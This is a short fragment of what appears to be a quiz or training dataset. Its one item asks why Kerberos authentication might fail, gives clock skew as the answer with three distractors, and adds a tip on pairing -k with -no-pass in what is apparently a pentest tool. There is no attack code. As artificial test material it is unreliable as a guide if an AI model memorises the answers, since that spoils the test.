         'prompt': 'Kerberos authentication fails and the message looks like '
                   'bad credentials. What else is worth checking?',
         'answer': 'Clock skew: more than five minutes and tickets are '
                   'rejected.',
         'distractors': ['That the password contains no special characters.',
                         'That SMB signing is disabled.',
                         'That the account is not a machine account.'],
         'teach': 'Also pair -k with -no-pass, or the script keeps asking for '
                  'a password it does not need.'},
    ],
}
